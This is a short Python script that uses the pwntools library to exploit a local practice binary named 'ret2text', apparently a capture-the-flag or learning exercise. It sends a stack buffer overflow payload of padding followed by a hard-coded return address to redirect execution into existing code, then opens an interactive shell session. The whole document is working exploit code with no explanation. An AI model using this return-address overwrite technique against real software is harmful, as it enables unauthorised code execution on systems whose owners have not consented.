from pwn import *


target = 0x804863a
offset = 0x6c + 4

sh = process('./ret2text')

raw_input()
payload = b'A' *offset  + p32(target)
sh.sendline(payload)
sh.interactive()
